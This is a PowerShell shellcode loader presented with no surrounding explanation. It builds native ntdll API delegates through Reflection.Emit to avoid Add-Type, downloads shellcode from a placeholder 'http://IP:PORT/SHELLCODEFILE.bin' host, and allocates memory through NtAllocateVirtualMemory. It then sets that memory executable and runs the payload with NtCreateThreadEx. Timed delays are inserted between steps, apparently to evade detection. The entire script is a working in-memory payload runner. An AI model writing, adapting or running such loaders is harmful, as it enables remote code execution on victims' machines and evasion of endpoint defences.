# Define dynamic assembly and module using Reflection.Emit to avoid Add-Type
$AssemblyBuilder = [System.AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('DynamicAssembly')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule')

# Define type for Kernel32 methods (LoadLibrary and GetProcAddress)
$Kernel32TypeBuilder = $ModuleBuilder.DefineType('Kernel32', 'Public, Class')

# Define LoadLibrary method
$LoadLibraryMethod = $Kernel32TypeBuilder.DefineMethod('LoadLibrary', 'Public, Static', [IntPtr], @([String]))
$DllImportCtor = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
$SetLastErrorField = [System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
$CharSetField = [System.Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
$AttributeBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($DllImportCtor, 'kernel32.dll', @($SetLastErrorField, $CharSetField), @($true, [System.Runtime.InteropServices.CharSet]::Auto))
$LoadLibraryMethod.SetCustomAttribute($AttributeBuilder)

# Define GetProcAddress method
$GetProcAddressMethod = $Kernel32TypeBuilder.DefineMethod('GetProcAddress', 'Public, Static', [IntPtr], @([IntPtr], [String]))
$AttributeBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($DllImportCtor, 'kernel32.dll', @($SetLastErrorField, $CharSetField), @($true, [System.Runtime.InteropServices.CharSet]::Ansi))
$GetProcAddressMethod.SetCustomAttribute($AttributeBuilder)

# Create the Kernel32 type
$Kernel32 = $Kernel32TypeBuilder.CreateType()

# Load ntdll.dll handle
$ntdllHandle = $Kernel32::LoadLibrary('ntdll.dll')

# Define delegate for NtAllocateVirtualMemory
$NtAllocateDelegateBuilder = $ModuleBuilder.DefineType('NtAllocateVirtualMemoryDelegate', 'AutoClass, AnsiClass, Class, Public, Sealed', [System.MulticastDelegate])
$NtAllocateCtor = $NtAllocateDelegateBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr]))
$NtAllocateCtor.SetImplementationFlags('Runtime, Managed')
$NtAllocateInvoke = $NtAllocateDelegateBuilder.DefineMethod('Invoke', 'HideBySig, NewSlot, Virtual, Public', [Int32], @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType(), [UInt32], [UInt32]))
$NtAllocateInvoke.SetImplementationFlags('Runtime, Managed')
$NtAllocateVirtualMemoryDelegate = $NtAllocateDelegateBuilder.CreateType()
$ntAllocateProc = $Kernel32::GetProcAddress($ntdllHandle, 'NtAllocateVirtualMemory')
$ntAllocate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ntAllocateProc, $NtAllocateVirtualMemoryDelegate)

# Define delegate for NtFreeVirtualMemory
$NtFreeDelegateBuilder = $ModuleBuilder.DefineType('NtFreeVirtualMemoryDelegate', 'AutoClass, AnsiClass, Class, Public, Sealed', [System.MulticastDelegate])
$NtFreeCtor = $NtFreeDelegateBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr]))
$NtFreeCtor.SetImplementationFlags('Runtime, Managed')
$NtFreeInvoke = $NtFreeDelegateBuilder.DefineMethod('Invoke', 'HideBySig, NewSlot, Virtual, Public', [Int32], @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [UInt32]))
$NtFreeInvoke.SetImplementationFlags('Runtime, Managed')
$NtFreeVirtualMemoryDelegate = $NtFreeDelegateBuilder.CreateType()
$ntFreeProc = $Kernel32::GetProcAddress($ntdllHandle, 'NtFreeVirtualMemory')
$ntFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ntFreeProc, $NtFreeVirtualMemoryDelegate)

# Define delegate for NtCreateThreadEx
$NtCreateThreadDelegateBuilder = $ModuleBuilder.DefineType('NtCreateThreadExDelegate', 'AutoClass, AnsiClass, Class, Public, Sealed', [System.MulticastDelegate])
$NtCreateThreadCtor = $NtCreateThreadDelegateBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr]))
$NtCreateThreadCtor.SetImplementationFlags('Runtime, Managed')
$NtCreateThreadInvoke = $NtCreateThreadDelegateBuilder.DefineMethod('Invoke', 'HideBySig, NewSlot, Virtual, Public', [Int32], @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32], [UInt32], [IntPtr]))
$NtCreateThreadInvoke.SetImplementationFlags('Runtime, Managed')
$NtCreateThreadExDelegate = $NtCreateThreadDelegateBuilder.CreateType()
$ntCreateThreadProc = $Kernel32::GetProcAddress($ntdllHandle, 'NtCreateThreadEx')
$ntCreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ntCreateThreadProc, $NtCreateThreadExDelegate)

# Define delegate for NtWaitForSingleObject
$NtWaitDelegateBuilder = $ModuleBuilder.DefineType('NtWaitForSingleObjectDelegate', 'AutoClass, AnsiClass, Class, Public, Sealed', [System.MulticastDelegate])
$NtWaitCtor = $NtWaitDelegateBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr]))
$NtWaitCtor.SetImplementationFlags('Runtime, Managed')
$NtWaitInvoke = $NtWaitDelegateBuilder.DefineMethod('Invoke', 'HideBySig, NewSlot, Virtual, Public', [Int32], @([IntPtr], [Bool], [IntPtr]))
$NtWaitInvoke.SetImplementationFlags('Runtime, Managed')
$NtWaitForSingleObjectDelegate = $NtWaitDelegateBuilder.CreateType()
$ntWaitProc = $Kernel32::GetProcAddress($ntdllHandle, 'NtWaitForSingleObject')
$ntWait = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ntWaitProc, $NtWaitForSingleObjectDelegate)

# Define delegate for NtProtectVirtualMemory
$NtProtectDelegateBuilder = $ModuleBuilder.DefineType('NtProtectVirtualMemoryDelegate', 'AutoClass, AnsiClass, Class, Public, Sealed', [System.MulticastDelegate])
$NtProtectCtor = $NtProtectDelegateBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr]))
$NtProtectCtor.SetImplementationFlags('Runtime, Managed')
$NtProtectInvoke = $NtProtectDelegateBuilder.DefineMethod('Invoke', 'HideBySig, NewSlot, Virtual, Public', [Int32], @([IntPtr], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [UInt32], [UInt32].MakeByRefType()))
$NtProtectInvoke.SetImplementationFlags('Runtime, Managed')
$NtProtectVirtualMemoryDelegate = $NtProtectDelegateBuilder.CreateType()
$ntProtectProc = $Kernel32::GetProcAddress($ntdllHandle, 'NtProtectVirtualMemory')
$ntProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ntProtectProc, $NtProtectVirtualMemoryDelegate)

# Define delegate for NtDelayExecution
$NtDelayDelegateBuilder = $ModuleBuilder.DefineType('NtDelayExecutionDelegate', 'AutoClass, AnsiClass, Class, Public, Sealed', [System.MulticastDelegate])
$NtDelayCtor = $NtDelayDelegateBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr]))
$NtDelayCtor.SetImplementationFlags('Runtime, Managed')
$NtDelayInvoke = $NtDelayDelegateBuilder.DefineMethod('Invoke', 'HideBySig, NewSlot, Virtual, Public', [Int32], @([Bool], [Int64].MakeByRefType()))
$NtDelayInvoke.SetImplementationFlags('Runtime, Managed')
$NtDelayExecutionDelegate = $NtDelayDelegateBuilder.CreateType()
$ntDelayProc = $Kernel32::GetProcAddress($ntdllHandle, 'NtDelayExecution')
$ntDelay = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ntDelayProc, $NtDelayExecutionDelegate)

# Define delegate for ZwSetTimerResolution
$ZwSetDelegateBuilder = $ModuleBuilder.DefineType('ZwSetTimerResolutionDelegate', 'AutoClass, AnsiClass, Class, Public, Sealed', [System.MulticastDelegate])
$ZwSetCtor = $ZwSetDelegateBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr]))
$ZwSetCtor.SetImplementationFlags('Runtime, Managed')
$ZwSetInvoke = $ZwSetDelegateBuilder.DefineMethod('Invoke', 'HideBySig, NewSlot, Virtual, Public', [Int32], @([UInt32], [Bool], [UInt32].MakeByRefType()))
$ZwSetInvoke.SetImplementationFlags('Runtime, Managed')
$ZwSetTimerResolutionDelegate = $ZwSetDelegateBuilder.CreateType()
$zwSetProc = $Kernel32::GetProcAddress($ntdllHandle, 'ZwSetTimerResolution')
$zwSet = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zwSetProc, $ZwSetTimerResolutionDelegate)

# Define SleepShort function
$once = $true
function SleepShort {
    param($milliseconds)
    if ($once) {
        $actualResolution = [UInt32]0
        $zwSet.Invoke(1, $true, [ref]$actualResolution)
        $script:once = $false
    }
    $interval = [Int64](-1 * $milliseconds * 10000.0)
    $ntDelay.Invoke($false, [ref]$interval)
}

# Define URL to download shellcode from
$url = "http://IP:PORT/SHELLCODEFILE.bin"

# Function to download shellcode from URL
function Download-Shellcode {
    param($url)
    $webClient = New-Object System.Net.WebClient
    $bytes = $webClient.DownloadData($url)
    return $bytes
}

# Ensure enough delay between operations
SleepShort 2000

# Download shellcode from URL
$shellcode = Download-Shellcode -url $url

# Calculate the size of the shellcode
$size = $shellcode.Length

# Ensure enough delay between operations
SleepShort 2000

# Allocate read-write memory using NtAllocateVirtualMemory
$addr = [IntPtr]::Zero
$sizeRef = [IntPtr]$size
$ntAllocate.Invoke([IntPtr]::new(-1), [ref]$addr, [IntPtr]::Zero, [ref]$sizeRef, 0x3000, 0x4) # AllocationType = MEM_COMMIT | MEM_RESERVE, Protect = PAGE_READWRITE
$size = $sizeRef.ToInt32() # Update size if changed

SleepShort 2000

# Copy the shellcode to the allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)

SleepShort 2000

# Change the memory protection to read-execute using NtProtectVirtualMemory
$oldProtect = [UInt32]0
$ntProtect.Invoke([IntPtr]::new(-1), [ref]$addr, [ref]$sizeRef, 0x20, [ref]$oldProtect) # NewProtect = PAGE_EXECUTE_READ

SleepShort 2000

# Create a new thread and execute the shellcode using NtCreateThreadEx
$thandle = [IntPtr]::Zero
$ntCreateThread.Invoke([ref]$thandle, 0x1FFFFF, [IntPtr]::Zero, [IntPtr]::new(-1), $addr, [IntPtr]::Zero, 0, 0, 0, 0, [IntPtr]::Zero)

# Wait for the thread to finish using NtWaitForSingleObject
$ntWait.Invoke($thandle, $false, [IntPtr]::Zero)

SleepShort 10000

# Free the allocated memory using NtFreeVirtualMemory
$ntFree.Invoke([IntPtr]::new(-1), [ref]$addr, [ref]$sizeRef, 0x8000) # FreeType = MEM_RELEASE
